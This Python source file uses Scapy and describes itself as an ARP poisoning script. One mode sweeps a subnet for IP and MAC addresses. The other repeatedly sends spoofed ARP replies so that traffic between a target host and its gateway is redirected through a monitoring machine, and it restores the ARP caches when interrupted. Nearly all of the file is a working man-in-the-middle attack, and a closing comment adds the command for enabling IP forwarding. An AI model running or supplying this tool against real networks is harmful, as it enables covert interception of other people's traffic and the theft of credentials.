import sys
import argparse
from scapy.all import *
import netifaces
from tabulate import tabulate
from netaddr import IPNetwork
import time

class ScapyUtility:

	# - hwsrc is the MAC corresponding to psrc, to update in the target's arp table
	# - pdst is where the ARP packet should go (target),
	# - psrc is the IP to update in the target's arp table,
	# - hwdst is the destination hardware address
	
	@staticmethod
	def _get_mac_from_ip(ip_address):
		resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=3, verbose=False)
		for s,r in resp:
			return r[ARP].hwsrc
		return None

	@staticmethod
	def _get_network_address(ip_address, net_mask):
		return str(IPNetwork(ip_address+"/"+net_mask).cidr)

	@staticmethod
	def _send_spoofed_arp_packet(target_ip, table_ip, table_mac):
		# send(ARP(op=2, pdst=target_ip, psrc=table_ip, hwdst=table_mac))
		send(ARP(op=2, pdst=target_ip, psrc=table_ip, hwsrc=table_mac))

	@staticmethod
	def arp_poison_redirect(target_ip, monitor_ip, gateway_ip):
		# Try to get Monitor PC's and Gateway MAC first as it is required for the spoofing
		target_mac = ScapyUtility._get_mac_from_ip(target_ip)
		monitor_mac = ScapyUtility._get_mac_from_ip(monitor_ip)
		gateway_mac = ScapyUtility._get_mac_from_ip(gateway_ip)

		if target_mac is None:
			print("No MAC found for {}.".format(target_ip))
		if monitor_mac is None:
			print("No MAC found for {}.".format(monitor_ip))

		if gateway_mac is None:
			print("No MAC found for {}.".format(gateway_ip))

		print("Target: {} , Monitor: {}, Gateway: {} ".format(target_mac, monitor_mac, gateway_mac))


		try:
			# Send a packet to A such that all
			print("spoofing...")
			i = 0
			while True:
				ScapyUtility._send_spoofed_arp_packet(target_ip, gateway_ip, monitor_mac)
				ScapyUtility._send_spoofed_arp_packet(gateway_ip, target_ip, monitor_mac)
				time.sleep(0.5)
				# print("Still poisoning ", i)
				# i += 1
			
		except KeyboardInterrupt:
			print("[*] Keyboard interupted... restoring ARP Cache")
			ScapyUtility._send_spoofed_arp_packet(target_ip, gateway_ip, gateway_mac)
			ScapyUtility._send_spoofed_arp_packet(gateway_ip, target_ip, target_mac)
			print("[*] Finished reseting gateway and target")

	@staticmethod
	def _scpy_arp_ping(ip_address):
		return srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address), timeout=10, verbose=False)

	@staticmethod
	def get_network_details(dest):
		ans, unans = ScapyUtility._scpy_arp_ping(dest)
		
		if (len(ans) > 0):
			tbl_data = [[rcv.sprintf(r"%ARP.psrc%"), rcv.sprintf(r"%Ether.src%")] for snd, rcv in ans]
			return tabulate(tbl_data, headers=['IP Address', 'MAC Address'])
		else:
			return None
 
def show_all_net_ifaces():
	routing_gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
	routing_nic_name = netifaces.gateways()['default'][netifaces.AF_INET][1] 

	for iface in netifaces.interfaces():
 		if iface == 'lo' or iface.startswith('vbox'):
 			continue

 		iface_details = netifaces.ifaddresses(iface)
 		print(len(iface_details))

 		if netifaces.AF_INET in iface_details:
 			print(iface_details[netifaces.AF_INET])
 			print(netifaces.gateways()['default'][netifaces.AF_INET])
	 		break


def show_all_network_interfaces(resolve_mac=True):
	IFACES.show(resolve_mac)



def show_all_routes(clean=True):
	if clean:
		pass
	conf.route.resync()
	print(conf.route)

def get_all_routes():
	conf.route.resync()
	return conf.route

def main():

	# get_interfaces()
	# show_all_network_interfaces(False)
	# get_network_details("192.168.1.0/24")	
	# show_all_routes()
	# show_all_net_ifaces()
	
	# print(_get_network_address("192.168.1.148", "255.255.255.0"))
	ScapyUtility.get_network_details("192.168.1.0")

	# print(_get_mac_from_ip("192.168.1.145"))


class ArgParser(argparse.ArgumentParser):
	
	def error(self, message):
		sys.stderr.write('error: %s\n' % message)
		self.print_help()
		sys.exit(2)

	def __init__(self):
		self.parser = argparse.ArgumentParser(description="This is an ARP poisoning script")
		self.parser.add_argument('-l', dest='network', help='Lists all IP & MAC Addresses for particular subnet. E.g -l 192.168.1.0/24', action='store')		
		self.parser.add_argument('-P', dest='arp_poison', help='ARP Poisoning for network redirection and monitoring.', action='store_true')		
		self.parser.add_argument('-T', dest='target_ip', help='*For -P* Target\'s IP address.', action='store')
		self.parser.add_argument('-M', dest='monitoring_ip', help='*For -P* Monitoring PC\'s IP address.', action='store')
		self.parser.add_argument('-GW', dest='gateway_ip', help='*For -P* Gateway\'s IP address.', action='store')

	def parse_arguments(self):

		args = self.parser.parse_args()

		if args.network:

			details = ScapyUtility.get_network_details(args.network)
			if details is None:
				print("[!] No network details found for {}".format(args.network))
			else:
				print(details)


		elif args.arp_poison:

			error_msg = "\n"
			if args.target_ip is None:
				error_msg += "[-T] is required\n"

			if args.monitoring_ip is None:
				error_msg += "[-M] Monitoring IP param is required\n"

			if args.gateway_ip is None:
				error_msg += "[-GW] Gateway is required\n"

			if error_msg != "\n":
				raise self.parser.error(error_msg)
			else:
				print("Correct", args.target_ip, args.monitoring_ip, args.gateway_ip)
				ScapyUtility.arp_poison_redirect(args.target_ip, args.monitoring_ip, args.gateway_ip)

		else:
			self.parser.print_help()
			sys.exit(2)
		

		# print(self.args)
if __name__=="__main__":

	A = ArgParser()
	A.parse_arguments()
	# print(getmacbyip("192.168.1.2"))
	# print(conf.route)
	# print(get_if_list())

	# main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward